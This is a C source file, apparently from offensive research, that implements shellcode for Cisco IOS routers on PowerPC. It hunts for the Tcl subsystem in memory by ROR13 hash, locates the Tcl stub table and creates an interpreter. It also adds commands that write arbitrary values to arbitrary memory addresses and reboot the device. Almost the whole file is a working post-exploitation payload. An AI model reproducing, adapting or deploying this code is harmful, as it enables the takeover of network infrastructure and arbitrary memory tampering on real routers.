#include <stdio.h>
#include <string.h>

#include "../cisco_ios/subsys.h"
#include "../cisco_ios/sched.h"
#include "../cisco_ios/arch/ppc/sys.h"
#include "../cisco_ios/arch/ppc/ppc_ebook_mmu.h"

#include "../tcl/tcl.h"
#include "../tcl/tclInt.h"

#include "../elf/elf.h"


FILE* stdout = NULL;

#define TCL_SUBSYSTEM 0x03181D6C


static inline void print_tty(const char* string)
{
	for( ;*string != 0; string++){
		_putc(*string);
  }
}


static inline unsigned int ror13_hash(const char *string)
{
    unsigned int hash = 0;

    while (*string) {
        unsigned int val = (unsigned int) *string++;
        hash = (hash >> 13)|(hash << 19);  // ROR 13
        hash += val;
    }
    return hash;
}


static inline void* find_subsystem(unsigned int start, unsigned int size, unsigned int hash)
{
	unsigned int off = start;
	while(off <= start + size){
		subsystype* p_subsystem = (subsystype*) off;

		if (p_subsystem->magic1 == CISCO_SUBSYS_MAGIC &&  
        p_subsystem->magic2 == CISCO_SUBSYS_MAGIC)
    {
      if ( hash == ror13_hash(p_subsystem->namestring)){
        return p_subsystem;
      } 
		}

		off += 1;
	}

	return NULL;
}


static inline void* find_string(unsigned int start, unsigned int size, char* str)
{
  char* pcur = (char*)start;
  char* pend = (char*)(start + size);

  for(; pcur <= pend; pcur++){
    if (strcmp(pcur, str) == 0){
      return pcur;
    }
  }
  return NULL;
}


static inline TclStubs* find_Tcl_stubs(unsigned int start, unsigned int size)
{
  unsigned long* pcur = (unsigned long*)start;
  unsigned long* pend = (unsigned long*)(start + size);

  for(;pcur < pend; pcur++){
    if(*pcur == TCL_STUB_MAGIC && *(pcur + 1) != 0){
      return (TclStubs*)pcur;
    }
  }
  return NULL;
}


//======================================
//    New Tcl's commands
//===

int wmem(void* clientData, void* interp, int argc, char** argv)
{
  // !!! Warning: For Cisco IOS the declaration of Inerp was modified, see tclInt.h !!!

  Interp *iPtr = (Interp *) interp;  // TODO: for more portability shoud pass tclStubPtr in clientData, because the Interp is not documented

  unsigned int* ptr = NULL;
  unsigned int  value = 0;
  
  if(argc != 3) {
    iPtr->stubTable->tcl_AppendResult(interp, "wrong args", (char *) NULL);
    return TCL_ERROR;
  }

  if(iPtr->stubTable->tcl_GetInt(interp, argv[1], &ptr) != TCL_OK) {
    return TCL_ERROR;
  }

  if(iPtr->stubTable->tcl_GetInt(interp, argv[2], &value) != TCL_OK) {
    return TCL_ERROR;
  }

  *ptr = value;
  
  return TCL_OK;
}

int reboot(void* clientData, void* interp, void* argc, void* argv)
{
  reset();

  return TCL_OK;
}

//======================================
//    main program
//===


void shellcode(void)
{

  TclStubs* tclStubsPtr = NULL;

  subsystype* subsys = NULL;

  // 0x01900000 is address of the coredump:data segemnt
  subsys = find_subsystem(0x01900000, 7*1024*1024, TCL_SUBSYSTEM);

  if (subsys != NULL){
    tclStubsPtr = find_Tcl_stubs((unsigned int)subsys, 1*1024*1024);
  }

  if (tclStubsPtr == NULL || tclStubsPtr->magic != TCL_STUB_MAGIC){
    breakpoint(); reset();
  }

  Tcl_Interp* interp = Tcl_CreateInterp();

  if(interp == NULL){
    breakpoint(); reset();
  }

  while(1){
    Tcl_Sleep(5000);
  };

  breakpoint();

}
